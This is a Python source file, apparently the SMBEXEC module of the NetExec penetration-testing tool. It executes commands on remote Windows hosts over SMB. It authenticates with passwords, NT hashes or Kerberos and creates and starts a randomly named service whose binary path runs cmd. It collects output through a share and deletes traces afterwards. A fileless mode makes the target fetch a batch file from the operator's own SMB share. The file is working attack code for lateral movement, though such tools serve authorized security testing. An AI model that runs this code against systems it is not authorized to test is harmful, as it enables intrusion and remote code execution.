import os
from os.path import join as path_join
from time import sleep
from impacket.dcerpc.v5 import transport, scmr
from nxc.helpers.misc import gen_random_string
from nxc.paths import TMP_PATH
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE


class SMBEXEC:
    def __init__(self, host, share_name, smbconnection, username="", password="", domain="", doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, share=None, port=445, logger=None, tries=None):
        self.__host = host
        self.__share_name = share_name
        self.__port = port
        self.__username = username
        self.__password = password
        self.__serviceName = gen_random_string()
        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__share = share
        self.__smbconnection = smbconnection
        self.__output = None
        self.__batchFile = None
        self.__outputBuffer = b""
        self.__shell = "%COMSPEC% /Q /c "
        self.__retOutput = False
        self.__rpctransport = None
        self.__scmr = None
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.logger = logger

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = f"ncacn_np:{self.__host}[\\pipe\\svcctl]"
        self.logger.debug(f"StringBinding {stringbinding}")
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.set_dport(self.__port)

        if hasattr(self.__rpctransport, "setRemoteHost"):
            self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.__scmr = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            self.__scmr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__scmr.connect()
        s = self.__rpctransport.get_smb_connection()
        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp["lpScHandle"]

    def execute(self, command, output=False):
        self.__retOutput = output
        if os.path.isfile(command):
            with open(command) as commands:
                for c in commands:
                    self.execute_remote(c.strip())
        else:
            self.execute_remote(command)
        self.finish()
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_remote(self, data):
        self.__output = gen_random_string(6)
        self.__batchFile = gen_random_string(6) + ".bat"

        command = self.__shell + "echo " + data + f" ^> \\\\%COMPUTERNAME%\\{self.__share}\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}" if self.__retOutput else self.__shell + data

        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
            batch_file.write(command)

        self.logger.debug("Hosting batch file with command: " + command)
        self.logger.debug("Command to execute: " + command)
        self.logger.debug(f"Remote service {self.__serviceName} created.")

        try:
            resp = scmr.hRCreateServiceW(
                self.__scmr,
                self.__scHandle,
                self.__serviceName,
                self.__serviceName,
                lpBinaryPathName=command,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )
            service = resp["lpServiceHandle"]
        except Exception as e:
            if "rpc_s_access_denied" in str(e):
                self.logger.fail("SMBEXEC: Create services got blocked.")
            else:
                self.logger.fail(str(e))

            return self.__outputBuffer

        try:
            self.logger.debug(f"Remote service {self.__serviceName} started.")
            scmr.hRStartServiceW(self.__scmr, service)

            self.logger.debug(f"Remote service {self.__serviceName} deleted.")
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception:
            pass

        self.get_output_remote()

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ""
            return

        # TODO: It looks like the service is hanging anyway until the command is finished, so all this timeout logic is likely not needed
        # Still adding this for now to keep the structure similar until we can confirm the above
        tries = 0
        while True:
            try:
                self.logger.info(f"Attempting to read {self.__share}\\{self.__output}")
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if tries > self.__tries:
                    self.logger.fail("SMBEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                    break
                if "STATUS_BAD_NETWORK_NAME" in str(e):
                    self.logger.fail(f"SMBEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                    break
                elif "STATUS_VIRUS_INFECTED" in str(e):
                    self.logger.fail("Command did not run because a virus was detected")
                    break
                # When executing powershell and the command is still running, we get a sharing violation
                # We can use that information to wait longer than if the file is not found (probably av or something)
                if "STATUS_SHARING_VIOLATION" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output} is still in use with {self.__tries - tries} left, retrying...")
                    tries += 1
                    sleep(1)
                elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output} not found with {self.__tries - tries} left, deducting 10 tries and retrying...")
                    tries += 10
                    sleep(1)
                else:
                    self.logger.debug(str(e))

        if self.__outputBuffer:
            self.logger.debug(f"Deleting file {self.__share}\\{self.__output}")
            self.__smbconnection.deleteFile(self.__share, self.__output)

    def execute_fileless(self, data):
        self.__output = gen_random_string(6)
        self.__batchFile = gen_random_string(6) + ".bat"
        local_ip = self.__rpctransport.get_socket().getsockname()[0]

        command = self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else self.__shell + data

        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
            batch_file.write(command)

        self.logger.debug("Hosting batch file with command: " + command)

        command = self.__shell + f"\\\\{local_ip}\\{self.__share_name}\\{self.__batchFile}"
        self.logger.debug("Command to execute: " + command)

        self.logger.debug(f"Remote service {self.__serviceName} created.")
        resp = scmr.hRCreateServiceW(
            self.__scmr,
            self.__scHandle,
            self.__serviceName,
            self.__serviceName,
            lpBinaryPathName=command,
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        service = resp["lpServiceHandle"]

        try:
            self.logger.debug(f"Remote service {self.__serviceName} started.")
            scmr.hRStartServiceW(self.__scmr, service)
        except Exception:
            pass
        self.logger.debug(f"Remote service {self.__serviceName} deleted.")
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output_fileless()

    def get_output_fileless(self):
        if not self.__retOutput:
            return

        while True:
            try:
                with open(path_join(TMP_PATH, self.__output), "rb") as output:
                    self.output_callback(output.read())
                break
            except OSError:
                sleep(2)

    def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpctransport.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp["lpScHandle"]
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp["lpServiceHandle"]
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception:
            pass
